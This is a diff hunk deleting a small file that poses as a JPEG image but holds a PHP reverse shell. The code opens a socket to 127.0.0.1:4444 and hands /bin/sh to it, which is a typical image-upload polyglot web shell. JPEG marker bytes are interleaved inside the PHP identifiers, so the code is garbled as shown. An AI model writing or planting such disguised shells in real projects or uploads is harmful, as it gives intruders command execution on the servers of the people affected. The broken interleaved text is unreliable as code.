@@ -1,6 +1,0 @@
-ÿØÿàÿÐ<?php
-$sock = fsockopen(ÿÑ"127.0.0.1", 4444);
-$desÿÒcriptorspec = array(0 =>ÿÓ $sock, 1 => $sock, 2 =>ÿÔ $sock);
-$process = procÿÕ_open("/bin/sh", $descriÿÖptorspec, $pipes);
-proc_ÿ×close($process);
-?>ÿÙ
